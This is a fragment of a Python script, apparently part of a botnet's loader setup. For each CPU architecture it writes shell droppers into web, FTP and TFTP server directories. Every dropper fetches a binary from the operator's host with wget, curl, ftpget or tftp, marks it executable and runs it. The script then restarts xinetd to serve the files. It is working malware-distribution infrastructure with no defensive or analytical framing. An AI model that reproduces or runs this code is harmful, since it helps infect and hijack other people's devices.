...
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+i+'; curl -O http://' + ip + '/'+i+';cat '+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/jack5tr.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+i+' '+i+';cat '+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/jack5tr1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+i+';cat '+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/jack5tr.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+i+' -g ' + ip + ';cat '+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/jack5tr2.sh')    
run("service xinetd restart &> /dev/null")
